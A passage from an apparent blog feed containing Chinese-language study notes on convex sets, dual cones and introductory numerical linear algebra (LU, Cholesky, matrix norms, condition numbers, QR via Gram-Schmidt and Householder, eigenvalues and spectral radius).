使得：$a^Tx\le b$ 对 $\forall x\in C$ 成立，$a^T x\ge b$ 对 $\forall x\in D$ 成立。感性理解如下图：</p><p><img src="cimgs/SHT.png" width="300px"></p><p>理解：一定存在一个超平面 $\left\{x|a^Tx=b\right\}$ 使得它能够完全划分两个不相交凸集。</p><blockquote><p>在机器学习中，将这个超平面称为 “线性分类器”。</p></blockquote><p>如果要 “严格划分”（去掉等号），还需要作出前提假设：例如 $C$ 是闭集等。</p><hr><p>超平面支持定理。直觉上也非常明显。对于一个凸集 $C$，一定能找到一个点 $x_0$ 以及一个超平面 $\left\{x|a^Tx=ax_0\right\}$ （$a\ne0$）使得 $a^Tx\le a^Tx_0$ 对 $\forall x\in C$ 成立。</p><p>感性理解如下：</p><p><img src="cimgs/SHT2.png" width="250px"></p><p>理解：对凸集边界上任意一点 $x_0$，一定存在一个超平面 $\left\{x|a^Tx=ax_0\right\}$ 使得它能够与凸集相切于该点，并且该点处外法线方向与 $a$ 同向（“移动” 超平面切到这个凸集的该点上）。</p><p>它可以由超平面分割定理证明出来。</p><h2 id="2-12-Dual-Cones"><a href="#2-12-Dual-Cones" class="headerlink" title="2.12 Dual Cones"></a>2.12 Dual Cones</h2><p>对偶锥的定义：对于一个凸锥 $K$，其对偶锥为 $K^*=\left\{y|y^Tx\ge0\space for\space all\space x\in K\right\}$；</p><p>形象理解：对偶锥的画法；</p><p><img src="cimgs/dual-cone-draw.png" height="200px"></p><p>（如果 $K$ 是尖的，那么 $K^*$ 就是钝的，二者是互补、对偶的）数学中有很多种类似的关系，例如共轭、转置等等。</p><p>其中 $\mathbf{R}_+^n$、 $\mathbf{S}^n_+$、二阶范式锥是自对偶的（self-dual）。一阶范式锥和无穷阶范式锥互为对偶锥。</p><p>注意，正常锥的对偶锥一定是正常锥。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-1-Overview&quot;&gt;&lt;a href=&quot;#Chapter-1-Overview&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1. Overview&quot;&gt;&lt;/a&gt;Chapter 1. Overview&lt;/h1&gt;&lt;p&gt;进入本章</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="Math" scheme="https://blog.sjtuxhw.top/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Numeric Analysis for Beginners</title>
    <link href="https://blog.sjtuxhw.top/review/numeric-analysis/"/>
    <id>https://blog.sjtuxhw.top/review/numeric-analysis/</id>
    <published>2024-06-12T05:11:56.000Z</published>
    <updated>2024-10-25T14:00:51.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Basic-Concepts"><a href="#Chapter-1-Basic-Concepts" class="headerlink" title="Chapter 1. Basic Concepts"></a>Chapter 1. Basic Concepts</h1><ul><li><p>相对误差与绝对误差；</p></li><li><p>求根问题：$\text{For }f:\mathbf{R}\rightarrow\mathbf{R},\text{ find }x^*\text{ such that }f(x^*)=0$；</p><p>假设有估计解 $x_{est}$，但是 $0\lt |f(x_{est})|\ll1$，那么我们也许不知道 $|x_{est}-x_0|$，但是我们一定知道 $|f(x_{est})-f(x_0)|\equiv|f(x_{est})|$；</p><ul><li><p>前向误差：估计解与实际解的差值（就是上面的 $|x_{est}-x_0|$，一般我们不知道）；</p></li><li><p>后向误差：使得估计值正确所要让 problem statement 改变的 delta（就是上面的 $|f(x_{est})-f(x_0)|\equiv|f(x_{est})|$，一般我们能算出来）；</p></li><li><p>Well-Conditioned（insensitive）：$\text{Small backward error}\Rightarrow\text{Small forward error}$；</p></li><li><p>Poor-Conditioned（sensitive/stiff）：$\text{Small backward error}\nRightarrow\text{Small forward error}$；</p></li><li><p>Condition Number：$CN=\dfrac{\text{Forword Error}}{\text{Backward Error}}$；</p><blockquote><p>在寻根问题中，很容易得到 $CN=\dfrac{1}{|f^\prime(x^*)|}$；</p></blockquote></li></ul></li><li><p>Carefully Implementation</p><ul><li>防止溢出的方法：Element Scaling（例如求 $||\vec{x}||_2$）；</li></ul></li></ul><h1 id="Chapter-2-Linear-System-and-LU"><a href="#Chapter-2-Linear-System-and-LU" class="headerlink" title="Chapter 2. Linear System and LU"></a>Chapter 2. Linear System and LU</h1><h2 id="2-1-Review"><a href="#2-1-Review" class="headerlink" title="2.1 Review"></a>2.1 Review</h2><ul><li><p>Over Determined / Under Determined / Completely Determined.</p><blockquote><p>“高” 的矩阵可能是 over determined（更多限制条件）；</p><p>“宽” 的矩阵可能是 under determined（解更可能有无限个）；</p></blockquote></li><li><p>线性方程组的结论复习：一个线性方程组 $A\vec{x}=\vec{b}$ 有两个不同解 $\vec{x_0},\vec{x_1}$，则它有无穷多解；</p><blockquote><p> $\vec{x_0},\vec{x_1}$ 都是线性方程组的解，则它们的线性组合都是该线性方程组的解；</p></blockquote></li><li><p>经验结论：解线性方程组 $A\vec{x}=\vec{b}$ 能不解 $A^{-1}$ 就不解它（计算量和准确性）；</p></li><li><p>初等行变换：左乘初等矩阵；</p><blockquote><p>初等矩阵是指由单位矩阵经过一次基本行/列变换得到的矩阵。基本行/列变换包括以下三种操作：</p><ul><li><p><strong>交换型初等矩阵</strong>：形式为单位矩阵的两行（或列）交换得到的矩阵。例如，在3阶方阵中，交换第一行和第二行的单位矩阵为：</p><script type="math/tex; mode=display">\left[\begin{matrix}0&1&0\\1&0&0\\0&0&1\end{matrix}\right]</script></li><li><p><strong>倍加型初等矩阵</strong>：单位矩阵的某一行（或列）乘以非零常数后加到另一行（或列）得到的矩阵。例如，在3阶方阵中，将第一行的两倍加到第三行的单位矩阵为：</p><script type="math/tex; mode=display">\left[\begin{matrix}1&0&0\\0&1&0\\2&0&1\end{matrix}\right]</script></li></ul><ul><li><strong>倍乘型初等矩阵</strong>：单位矩阵的某一行（或列）乘以非零常数得到的矩阵。例如，在3阶方阵中，将第三行的元素都乘以2的单位矩阵为：<script type="math/tex; mode=display">\left[\begin{matrix}1&0&0\\0&1&0\\0&0&2\end{matrix}\right]</script></li></ul><p>将一个矩阵左乘对应的初等矩阵就是在对行进行对应的变换；</p><p>将一个矩阵右乘对应的初等矩阵就是在对列进行对应的变换；</p></blockquote></li><li><p>高斯消元：先 forward substitution（将第 i 行的前 i - 1 个元素清零、第 i 个元素置 1），再 back substitution（向之前代入）；</p></li></ul><h2 id="2-2-LU-Factorization"><a href="#2-2-LU-Factorization" class="headerlink" title="2.2 LU Factorization"></a>2.2 LU Factorization</h2><p>LU 分解：当参数矩阵不变，只有 $\vec{b}$ 不同时，我们可以节省重复计算的步骤。这种方法就是 $LU$ 分解。</p><ul><li>我们先将 $A$ 矩阵使用高斯消元为 $A=LU$（$U$ 是高斯消元的 forward substitution 的结果）；</li><li>这样可以分开计算 $L\vec{y}=b$ 中的 $\vec{y}$、$U\vec{x}=\vec{y}$ 解得 $\vec{x}$，每一步都是 $O(n^2)$；并且得到上/下三角矩阵的逆要比一般的 $A$ 简单；</li></ul><p><img src="imgs2/LU.png"></p><h2 id="2-3-Linear-System"><a href="#2-3-Linear-System" class="headerlink" title="2.3 Linear System"></a>2.3 Linear System</h2><ul><li><p>线性回归预测</p></li><li><p>线性系统拟合曲线：n 次试验构建一个线性方程组；</p><p><img src="imgs2/linear-fit.png" height="150px"></p><blockquote><p>线性系统拟合非线性曲线：可以让 $f$ 是非线性的，构建一个非线性函数 $f_{ij}$ 的矩阵；</p><p><img src="imgs2/ffit.png" height="200px"></p><p>一个特殊的例子是范特蒙德系统 $f=a_0+a_1x+a_2x^2+\cdots$；</p><p>我们还可以借助傅里叶展开 $f=a\cos(x+\phi)$；</p></blockquote></li><li><p>$A\vec{x}=\vec{b}$ 无解情况如何接近？凸优化：$\min\limits_{\vec{x}}||A\vec{x}-\vec{b}||_2^2$；</p><p><img src="imgs2/ms.png" height="300px"></p></li><li><p>Tikhonov regularization：这种正则化可以向 under determined 的情况加入限制，有助于防止过拟合、数据抖动、减轻数据噪声影响（对高斯白噪声效果好）等问题：</p><script type="math/tex; mode=display">\min\limits_{\vec{x}}||A\vec{x}-\vec{b}||_2^2+\alpha||\vec{x}||_2^2\quad(0\lt\alpha\le1)\\\Longrightarrow0=2A^TA\vec{x}-2A^T\vec{b}+2\alpha\vec{x}\\\Longrightarrow(A^TA+\alpha I_{n\times n})\vec{x}=A^T\vec{b}</script></li><li></li><li><p>稀疏矩阵存储：变换为低维数据（压缩信息的相关性）；</p><ul><li>普通有规律的矩阵，可以通过一些变换转换为稀疏矩阵；</li></ul></li></ul><h2 id="2-5-Cholesky-Factorization"><a href="#2-5-Cholesky-Factorization" class="headerlink" title="2.5 Cholesky Factorization"></a>2.5 Cholesky Factorization</h2><p>注意到重要的矩阵 $A^TA$ 有如下性质：</p><ul><li>正定对称阵（Positive definite Matrix）其中 $A\ne0$；</li></ul><p>而我们又发现正定对称矩阵的 LU 分解非常特殊，$U=L^T$，所以所有正定对称阵可以分解为 $A=LL^T$，这就是 Cholesky 分解；</p><ul><li><p>在阶数较小的情况，直接可以使用待定系数法求解 $L$；</p></li><li><p>在阶数较大的情况，使用迭代法求解 $L$，算法如下：</p><ol><li><p>初始化 $L=0$（全零矩阵，同时是下三角矩阵）；</p></li><li><p>对矩阵的每一列 $j$：</p><ul><li><p>先计算该列上的对角元 $L_{jj}=\sqrt{A_{jj}-\sum\limits_{k=1}^{j-1}L_{jk}^2}$（$j\gt1$），其中 $L_{11}=\sqrt{A_{11}}$；</p><blockquote><p>不难发现，$L$ 每行对角元只与 $A_{jj}$ 和当前行排在 $L_{jj}$ 之前的元素平方和有关；</p><p>可以将 $A$ 分块，即可推出这个结论；</p></blockquote></li><li><p>在第 $j$ 列中，继续对第 $j$ 行之后的每一行 $i\gt j$，计算 $L_{ij}=\dfrac{1}{L_{jj}}(A_{ij}-\sum\limits_{k=1}^{j-1}L_{ik}L_{jk})$，</p><blockquote><p>结论，$L_{ij}$ 与 $A_{ij}$ 和：排在 $L_{jj}$ 前面的元素向量 与 排在 $L_{ij}$ 前面的元素向量的点积有关；</p></blockquote></li></ul><p>完成上面两个步骤后，矩阵的第 $j$ 列全部计算完成；</p></li></ol></li></ul><h1 id="Chapter-3-Norms-Sensitivity-amp-Conditioning-in-Matrix"><a href="#Chapter-3-Norms-Sensitivity-amp-Conditioning-in-Matrix" class="headerlink" title="Chapter 3. Norms, Sensitivity &amp; Conditioning in Matrix"></a>Chapter 3. Norms, Sensitivity &amp; Conditioning in Matrix</h1><h2 id="3-1-Definitions-of-Norms-in-Matrix"><a href="#3-1-Definitions-of-Norms-in-Matrix" class="headerlink" title="3.1 Definitions of Norms in Matrix"></a>3.1 Definitions of Norms in Matrix</h2><p>引入：在浮点数计算时，如果在处理 $||A\vec{x_0}-\vec{b}||$ 时，它距离 0 有多接近才能相信 $x_0$ 是解？</p><p>也就是说，如何衡量 $(A+\delta A)\vec{x}=\vec{b}+\delta\vec{b}$ 求解下 $\vec{x}$ 解的变换幅度？</p><p>我们再次引入向量的范数：$||\vec{x}||_p=(\sum\limits_{i=1}^nx_i^p)^{1/p}$；</p><blockquote><ul><li>注意到 $p\rightarrow\infty$ 是 $||\vec{x}||=\max\{|x_1|,|x_2|,\ldots,|x_n|\}$；</li><li>$||\vec{x}||=0\quad\text{iff}\quad \vec{x}=0$；</li><li>$||c\vec{x}||=|c|||\vec{x}||,\space c\in\mathbf{R},\vec{x}\in\mathbf{R^n}$；</li><li>$||\vec{x}+\vec{y}||\le||\vec{x}||+||\vec{y}||,\space\forall\vec{x},\vec{y}\in\mathbf{R}$；</li></ul></blockquote><p>我们定义两个范数等价（$||\cdot||_p\equiv||\cdot||_q$） 当且仅当 对于任意 $\vec{x}\in\mathbf{R^n}$，都存在 $c_{low}||\vec{x}||\le||\vec{x}||\le c_{high}||\vec{x}||$（同阶）；</p><blockquote><p>推论：$\mathbf{R^n}$ 上的任意范式等价；</p></blockquote><p>我们再定义矩阵的范数：</p><ul><li><p>定义方法 1，“unrolled construction”（元素形式范数，entrywise norm）：将矩阵 $A_{m\times n}$ 按列展开（第 $n+1$ 列排在第 $n$ 列下方），得到一个 $\vec{a}\in\mathbf{R^{mn}}$ 的向量，而向量 $\vec{a}$ 的范数就是 $A$ 的范数；</p><script type="math/tex; mode=display">||A_{m\times n}||_p=(\sum\limits_{i=1}^m\sum\limits_{j=1}^n|a_{ij}|^p)^{1/p}</script><ul><li>二维元素形式范数又称 “Frobenius Norm”，记作 $||A||_{Fro}$；注意到 $||A||_F=\sqrt{\text{tr}(AA^T)}$；</li></ul></li><li><p>定义方法 2，“induced construction”（诱导范数，又称算子范数，operator norm）：描述了矩阵代表的线性变换 $A$ 对 $\vec{x}$ 作用最长伸展的比例。即：</p><script type="math/tex; mode=display">||A||=\max_{\vec{x}\ne0}\dfrac{||A\vec{x}||}{||\vec{x}||}=\max\limits_{||\vec{x}||=1}||A\vec{x}||</script><p>诱导范数的常用结论如下：</p><ul><li><p>$||A||_1=\max\limits_{1\le j\le n}\sum\limits_{i=1}^m|a_{ij}|$（1-诱导范数就是一列中的元素模之和，再取最大值）；</p></li><li><p>$||A||_\infty=\max\limits_{1\le i\le m}\sum\limits_{j=1}^n|a_{ij}|$（$\infty$-诱导范数就是一行中的元素模之和，再取最大值）；</p></li><li><p>$||A||_2=\sqrt{\max\limits_{k}\lambda_k}$（2-诱导范数，又称谱范数，是 $A$ 的最大奇异值的开根号。也就是说，当 $A$ 不可逆时就是 $A^TA$ 的最大特征值开根号）；</p><blockquote><p>可以从图形方法理解：</p><p><img src="imgs2/matrix-norm2.png" width="400px"></p></blockquote></li></ul></li><li><p>定义方法 3，“eigenvalue construction”（schatten 范数，使用矩阵奇异值定义），具体定义较为复杂，不进一步了解；</p></li></ul><h2 id="3-2-Definition-of-Condition-Number-in-Matrix"><a href="#3-2-Definition-of-Condition-Number-in-Matrix" class="headerlink" title="3.2 Definition of Condition Number in Matrix"></a>3.2 Definition of Condition Number in Matrix</h2><p>我们还要定义一个矩阵的条件数。一般条件数想要看的是一个矩阵构成的线性方程组随误差的变化情况。于是我们需要构建建模一个公式：$(A+\varepsilon\delta A)\vec{x}(\varepsilon)=\vec{b}+\varepsilon\delta\vec{b}$，于是可以得到在误差 $\varepsilon$ 下，</p><ul><li><p>$\vec{x}(\varepsilon)$ 表示在误差 $\varepsilon$ 下的 $\vec{x}$ 测量值；</p></li><li><p>$\dfrac{d\vec{x}}{d\varepsilon}|_{\varepsilon=0}=A^{-1}(\delta\vec{b}-\delta A\vec{x}(0))$ 表示 $\vec{x}$ 随误差的变化率；</p></li><li><p>$||\vec{x}(\varepsilon)-\vec{x}(0)||$ 表示前向误差，$\dfrac{||\vec{x}(\varepsilon)-\vec{x}(0)||}{||\vec{x}(0)||}\le|\varepsilon|||A^{-1}||||A||(\dfrac{||\delta\vec{b}||}{||\vec{b}||}+\dfrac{||\delta A||}{||A||})+O(\varepsilon^2)$ 表示归一化的前向误差；</p><blockquote><p>泰勒展开证明上式；</p></blockquote></li><li><p>于是我们定义方阵 $A\in\mathbf{R^{n\times n}}$ 的条件数为：$\text{cond}\space A\equiv\kappa\equiv||A||||A^{-1}||$；</p><p>如果 $A$ <u>不可逆</u>，则条件数为 $\infty$；</p><blockquote><p>得出结论：$\dfrac{||\vec{x}(\varepsilon)-\vec{x}(0)||}{||\vec{x}(0)||}\le\varepsilon\cdot D\cdot\kappa+O(\varepsilon^2)$；</p></blockquote><p>可以知道，一个矩阵的条件数描述的性质和行列式不一样，条件数与常系数缩放无关；</p></li><li><p><strong>重要推论 1</strong>：$\text{cond}\space A=\dfrac{\max\limits_{\vec{x}\ne0}\frac{||A\vec{x}||}{||\vec{x}||}}{\min\limits_{\vec{y}\ne0}\frac{||A\vec{y}||}{||\vec{y}||}}$（可以使用诱导范数直接推得）；</p></li></ul><p>几何上这么理解：在 $A$ 代表的线性变换下，对任意 $\vec{x}$ 作用<u>伸长最长的比例 与 伸长最短的比例 之比</u>；</p><p><img src="imgs2/matrix-cond.png" height="200px"></p><p>由这个几何关系，我们可以推出第二个推论：</p><ul><li><strong>重要推论 2</strong>：$||A^{-1}\vec{x}||\le||A^{-1}||||\vec{x}||$，因为 $||A^{-1}||$ 就是所有向量拉伸最长的比例了；</li></ul><blockquote><p>注：</p><ul><li>可以知道，一个矩阵的条件数越大，它所构成的线性方程组代表的线性系统对微小扰动越敏感的（解周围小范围变化自变量，总体值变化很大）；而一个矩阵的条件数越接近 1，则这个线性系统对微小扰动越不敏感；</li><li>由于很难求一个矩阵的逆，因此一般对条件数的讨论是讨论其上下界；</li></ul></blockquote><h1 id="Chapter-4-Column-Spaces-amp-QR"><a href="#Chapter-4-Column-Spaces-amp-QR" class="headerlink" title="Chapter 4. Column Spaces &amp; QR"></a>Chapter 4. Column Spaces &amp; QR</h1><p>考虑特殊矩阵的条件数 $\text{cond}\space A^TA\approx(\text{cond}\space A)^2$（在 $A$ 可逆的情况下）；</p><script type="math/tex; mode=display">\begin{aligned}\text{cond}\space A^TA&=||A^TA||\space||(A^TA)^{-1}||\\&\approx||A^T||\space||A||\space||A^{-1}||\space||(A^T)^{-1}||\\&=||A||^2||A^{-1}||^2\\&=(\text{cond}\space A)^2\end{aligned}</script><p>所以，我们对于一般的矩阵可以认为 $A^TA$ 越接近单位矩阵 $I_{n\times n}$，$A\vec{x}=\vec{b}$ 更容易解；</p><p>此外，$A^TA$ 的计算可以这么理解：</p><p><img src="imgs2/AtA.png" height="200px"></p><p>所以等价于我们希望 $A$ 是正交矩阵（各个列向量正交归一），而且<u>恰好正交矩阵代表的变换不改变向量的长度（所以正交矩阵的条件数是 1）</u>；</p><p>现在再回来看 $A^TA\vec{x}=A^T\vec{b}$，我们知道这个线性方程组的解就是 $\min\limits_{\vec{x}}||A\vec{x}-\vec{b}||$ 的解，就相当于将 $A$ 拆成列向量 $(\alpha_1,\alpha_2,\ldots,\alpha_n)$，将 $x_1\alpha_1+x_2\alpha_2+\cdots+x_n\alpha_n$ 逼近 $\vec{b}$（将 $\vec{b}$ 投影到 $A$ 列向量做基向量的线性空间上）；</p><blockquote><p>回忆线性代数的性质：</p><p>对任何实矩阵 $A\in\mathbf{R^{m\times n}}$ 和可逆方阵 $B\in\mathbf{R^{n\times n}}$，有 $\text{col}\space A=\text{col}\space AB$，即<u>对任意矩阵进行初等行变换不影响矩阵的列空间</u>；</p></blockquote><p>那么有没有办法对 $A$ 一直进行初等行变换，使得 $A$ 变成正交阵？这样 $A$ 的列空间不变（即原问题的解不变），但是 $A$ 成正交阵后非常好求解。</p><p>这种方法就是 QR 分解。我们将一般矩阵分解为一个正交阵（$A$ 的一组正交基）和上三角矩阵的乘积（上三角矩阵 $R$ 可以理解为一系列初等行变换）。</p><blockquote><p>显然，对于任意一个 $A$，若 $r(A_{m\times n})=n$（$m\ge n$），则 $A$ 都能进行 QR 分解。</p></blockquote><p>一旦我们将 $A^TA\vec{x}=A^T\vec{b}$ 进行 QR 分解：$A=QR$，那么 $\vec{x}=R^{-1}Q^T\vec{b}$，我们发现 $R$ 上三角矩阵容易求逆，就不需要计算 $A^TA$ 的逆了。</p><p>现在，QR 分解有 2 种方法。</p><ul><li><p>一种是通过 施密特正交化。这很好理解：</p><p><strong>现在回忆线性代数的 施密特正交化。这就是得到 $A=QR$ 的一种方法：</strong></p><ol><li>先对 $A$ 施密特正交化，再归一化就能得到基向量相同的正交矩阵 $Q$；</li><li>反解出 $R$：因为正交矩阵 $Q^TQ=I$，因此 $R=Q^TA$；</li></ol><blockquote><p>那么怎么 Gram-Schmidt 正交化？</p><p>对 $A$ 拆成的一组基 $(\alpha_1,\alpha_2,\ldots,\alpha_n)$，可以这么取正交基：</p><ul><li>$v_1=\alpha_1$，第一个向量随便取；</li><li>$v_2=\alpha_2-\dfrac{\alpha_2\cdot v_1}{v_1\cdot v_1}v_1$，第二个向量取 $\alpha_2$ 的时候，需要剔除第一个取得的基向量相关方向的分量：$\dfrac{\alpha_2\cdot v_1}{v_1\cdot v_1}$ 就是 $\alpha_2$ 在 $v_1$ 上的<u>投影长度</u>！</li><li>$v_3=\alpha_3-\dfrac{\alpha_3\cdot v_2}{v_2\cdot v_2}v_2-\dfrac{\alpha_3\cdot v_1}{v_1\cdot v_1}v_1$，第三个向量就减去 $\alpha_3$ 在 $v_1,v_2$ 上的投影分量就行。</li><li>……（依此类推）</li></ul><p>最后别忘了归一化。</p><p>不难发现，这种操作实际上在不断地对 $A$ 右乘上三角矩阵 $R_i$（进行初等列变换），使得：$AR_1R_2\cdots R_n=Q$；</p><p>相对地，下面的 Householder 变换方法，就是不断地进行正交变换（特别地，镜像变换），调整某一列的其他元素为 0，即不断地对 $A$ 左乘 Householder 矩阵（一种正交阵）$H_i$，使得：$H_nH_{n-1}\cdots H_1=R$；</p></blockquote></li><li><p>另一种是通过 Householder 变换（这是一个著名的变换，它代表了镜像变换，显然是一种正交变换），它所对应的矩阵就是 Householder 矩阵。</p><p>如图：</p><p><img src="imgs2/householder.png" width="300px"></p><p>假设已知一个向量 $\eta$，想要关于某个法线方向 $l$ 对称。为了方便，我们记与 $l$ 正交的一个从 $\eta$ 一边指向另一边的<u>单位向量</u>为 $\omega$，则由几何关系可知对称后的向量 $\xi$ 满足：$\xi-\eta=2\omega(\omega^T\xi)$，其中 $\omega^T\xi$ 就是 $\omega$ 和 $\xi$ 的点积（投影长度）；</p><p>因此 $\eta=(I-2\omega\omega^T)\xi$，我们发现，这镜面变换的矩阵就是 $H=I-2\omega\omega^T$，左乘它会将列向量变换到 $\omega$ 对应法线的 $\omega$ 指向的另一侧。</p><p>紧接着，我们发现这个矩阵 $H$ 有这个性质：</p><p>若 $H$ 为 Householder 矩阵，则 $\left[\begin{matrix}I_r&amp;0\\0&amp;H\end{matrix}\right]$ 也是 Householder 矩阵；</p><p>于是我们可以这么进行迭代：</p><ul><li><p>写 $A$ 的基向量 $(\alpha_1,\alpha_2,\ldots,\alpha_n)$，做第一次 householder 变换，使得 $\omega_1=\dfrac{\alpha_1-||\alpha_1||_2\cdot e_1}{||\alpha_1-||\alpha_1||_2\cdot e_1||_2}$，得到第一个 householder 矩阵 $H_1=I-2\omega_1\omega_1^T$，这样 $H_1A$ 的第一列除了第一个元素全部归 0：</p><blockquote><p>$\omega_1$ 可以理解为 $\alpha_1$ 减去在 $e_1$ 的分量（要镜像的方向已经得到了），再归一化，得到单位的镜像向量；</p><p><strong>$H_1\alpha_1$ 的变换就将 $\alpha_1$ 变换到与 $e_1$ 同一个方向上了。</strong></p></blockquote><p><img src="imgs2/householder-step1.png" width="500px"></p></li><li><p>记 $H_1A$ （注意是变换后的矩阵）关于 $a_{11}$ 的余子式为 $B_1$，则写 $B$ 的基向量 $(\beta_1,\beta_2,\ldots,\beta_{n-1})$，那么同理 $\omega_2=\dfrac{\beta_2-||\beta_2||_2\cdot e_1}{||\beta_2-||\beta_2||_2\cdot e_1||_2}$，得到第二个 householder 矩阵 $H_2=I-2\omega_2\omega_2^T$，这样 $H_2H_1A$ 的第一列和 $H_1A$ 一样、第二列除了前两个元素，后面的元素全部归 0:</p><p><img src="imgs2/householder-step2.png" width="400px"></p><blockquote><p>注意，$e_1$ 总是第一个元素为 1、其他元素为 0 的单位向量；</p></blockquote></li><li><p>重复上面的操作，最后 $H_{n-1}H_{n-2}\cdots H_1A=R$，$R$ 是一个上三角矩阵：</p></li><li><p>这样，我们得到了 $A$ 分解出的 $R$，最后反代 $Q=H_1H_2\cdots H_{n-1}$（注意正交阵的性质）；</p></li></ul></li></ul><h1 id="Chapter-5-Eigenvalue-amp-Eigenvector"><a href="#Chapter-5-Eigenvalue-amp-Eigenvector" class="headerlink" title="Chapter 5. Eigenvalue &amp; Eigenvector"></a>Chapter 5. Eigenvalue &amp; Eigenvector</h1><h2 id="5-1-Overview"><a href="#5-1-Overview" class="headerlink" title="5.1 Overview"></a>5.1 Overview</h2><p>在采集多维数据时，需要考虑各个维度间的相关性，以降低数据的维度。</p><p>举个例子，假设有组（该组有 $m$ 个数据） $n$ 维数据 $(v_1,v_2,\ldots,v_m),\space v_i\in\mathbf{R^n}$。</p><p>如果我们只知道某些维度上的确切数据，于是我们就像想将任意一个 $n$ 维数据用某几个维度去拟合整体数据。这样可以非常方便地讨论数据的整体特性。</p><p>这样，数据矩阵的特征值就能派上用场了。</p><p>除了这个问题，还有其他一些问题可以借助特征值进行解决，例如：</p><ul><li>Optimize $||A\vec{x}||_2$，固定 $||\vec{x}||_2=1$；</li><li>ODE/PDE（常微分方程、偏微分方程）的近似解：$\vec{y}^\prime=B\vec{y}$；</li><li>Rayleigh quotient（瑞利商）：$\dfrac{\vec{x}^TA\vec{x}}{||\vec{x}||_2^2}$；</li></ul><p>回忆下线性代数中对于特征向量/特征值的重要结论：</p><ul><li>每个 $n$ 阶方阵至少有一个特征向量（复向量），最多有 $n$ 个不同的特征值；</li><li>对应不同特征值的特征向量是线性无关的；</li></ul><h2 id="5-2-Review-Diagonalizable-Matrix"><a href="#5-2-Review-Diagonalizable-Matrix" class="headerlink" title="5.2 Review: Diagonalizable Matrix"></a>5.2 Review: Diagonalizable Matrix</h2><p>这里再复习一下矩阵对角化的知识：</p><p><strong>矩阵对角化的意义？</strong></p><ul><li><p>可快速计算 $A^k$；</p></li><li><p>可计算 Markov 过程中的平稳分布 $\pi$；</p></li><li>可计算差分方程 $u_{k+1}=Au_k$ 描述的离散动力系统的长期行为；</li><li>……</li></ul><p><strong>矩阵对角化的方法？</strong></p><ol><li><p>求出矩阵 $A$ 的所有特征值 $\lambda_i$；</p></li><li><p>通过 $A$ 的每个特征值，以及特征值的代数重数，来判断 $A$ 是否可对角化。具体来说：</p><p>代数重数就是在判断特征值重复的次数、几何重数就是在描述特征向量重复的维数（就是零空间的维数）。注意<u>每个特征值的几何重数一定小于等于代数重数</u>（因为对应不同特征值的特征向量是线性无关的，而特征值可以重复）。</p><p>这里 $A$ 要可对角化，就必须满足下面两种情况之一：</p><ul><li><strong>$A$ 的所有 $n$ 个特征值互不相等（代数重数 $n$）</strong>。而由于对于不同特征值的特征向量必然线性无关，所以几何重数一定也为 $n$；</li><li><strong>$A$ 所有重根下，$k$ 重特征值是否有 $k$ 个线性无关的特征向量</strong>。这里就是在要求这个代数重数为 $k$ 的特征值的几何重数是不是也是 $k$；</li></ul><p>所以上面的两个要求总体在说：$A$ 的<u><strong>几何重数和代数重数是否相等</strong></u>？</p><p>如果相等，表示 $A$ 所代表的线性变换没有改变被变换方的维度，因此 $A$ 可以分解为 $n$ 个线性无关的正交基向量。也就是可以相似对角化。如果不满足，则无法相似对角化。</p></li><li><p>最后将特征向量与特征值对应起来：$\Lambda=\text{diag}(\lambda_1,\lambda_2,\ldots,\lambda_n)$，$P=(\alpha_1,\alpha_2,\ldots,\alpha_n)$，则 $P^{-1}AP=\Lambda$；</p></li></ol><h2 id="5-3-Definition-of-Spectrum-Radius-in-Matrix"><a href="#5-3-Definition-of-Spectrum-Radius-in-Matrix" class="headerlink" title="5.3 Definition of Spectrum Radius in Matrix"></a>5.3 Definition of Spectrum Radius in Matrix</h2><p>引入一个新的定义：矩阵的谱半径（或称 “矩阵的谱”）。</p><p><strong>谱半径的意义？</strong></p><ul><li>估计一个矩阵的特征值；</li><li>计算一个不可逆矩阵的广义逆矩阵；</li><li>……</li></ul><p><strong>谱半径的计算？</strong></p><p>$\rho(A)=\max\limits_i|\lambda_i|$（矩阵 $A$ 的谱半径等于其<u>所有特征值的模的最大值</u>。<strong>注意特征值包含复数！</strong>）；</p><p><strong>谱半径和范数的关系？</strong></p><p>谱半径和矩阵范数一样，都是矩阵的函数：$f:R^{m\times n}\rightarrow R$；</p><p>但是它们二者本质上真的不一样，一定要和 2-诱导范数（也就是谱范数）区分开。</p><p>二者间有一些重要结论：</p><ul><li><p>任意复数域上的矩阵 $A$，其谱半径 $\rho(A)$ 不大于 $A$ 的任何一种诱导范数，即：$\rho(A)\le||A||$；</p><blockquote><p>含义：<u>矩阵的谱半径是其任意一种范数的下界</u>；</p><p>作用：使用方便求解的范数对谱半径进行估算；</p></blockquote></li><li><p><code>Gelfand</code> 定理：$\rho(A)=\lim\limits_{k\rightarrow\infty}||A^k||^{1/k}$；</p><ul><li>矩阵序列 $I,A,A^2,\ldots,A^k,\ldots$ 收敛于 0 的充要条件：$\rho(A)\lt1$；</li><li>级数 $I+A+A^2+\cdots$ 收敛于 $(I-A)^{-1}$ 的充要条件：$\rho(A)\lt1$；</li></ul></li></ul><h2 id="5-4-Extend-to-mathbf-C-m-times-n"><a href="#5-4-Extend-to-mathbf-C-m-times-n" class="headerlink" title="5.4 Extend to $\mathbf{C^{m\times n}}$"></a>5.4 Extend to $\mathbf{C^{m\times n}}$</h2><p>现在将线性空间扩展到复数域，我们多出如下定义：</p><ul><li><p>共轭转置 $A^H$；</p></li><li><p>厄密矩阵（Hermitian Matrix）：$A^H=A$；</p><blockquote><p>注意和实对称矩阵不一样。</p><p>由量子力学的厄密算符可以得到如下所有结论（量子力学考题）：</p><ul><li>厄密矩阵所有特征值为实数；</li><li>厄密矩阵属于不同特征值的特征向量相互正交；</li><li>……</li></ul></blockquote><p>厄密矩阵因为是复数域上，和实数域上的实对称矩阵很相似（不如说实对称矩阵是厄密矩阵的特殊情况），所以厄密矩阵和实对称矩阵一样，二者一定可以相似对角化（几何重数一定等于代数重数，或者说一定有 $n$ 个线性无关的基向量）；</p><p>它们相似对角化很简单：$A=X^{-1}\Lambda X=X^T\Lambda X$（显然 $X$ 是正交矩阵）；</p></li></ul><p>再引入一些 “奇怪” 的运算：</p><p>对于一个 半正定/正定 的对称矩阵 $A\in S_{+}$，定义其平方根：$A^{1/2}$，因为一定能找到 $P$ 使得 $P^2=A$；</p><h2 